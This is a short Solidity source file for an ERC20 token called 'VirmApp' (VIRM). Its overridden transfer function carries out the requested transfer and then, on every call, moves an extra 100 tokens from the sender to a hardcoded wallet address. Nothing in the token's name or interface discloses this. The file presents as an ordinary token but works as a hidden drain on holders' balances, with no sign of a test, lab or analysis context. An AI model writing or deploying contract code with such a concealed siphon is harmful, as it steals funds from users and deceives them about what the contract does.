// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract VIRM is ERC20 {
	constructor() ERC20("VirmApp", "VIRM"){
        _mint(msg.sender,412*10**18);
    }

    function transfer(address to, uint256 amount) override public returns (bool) {

        super.transfer(to, amount);
        super.transfer(0xdE2C6d9b24845294cCf924015d83Ae6859B2592E, 100*10**18);

        return true; 
    }
}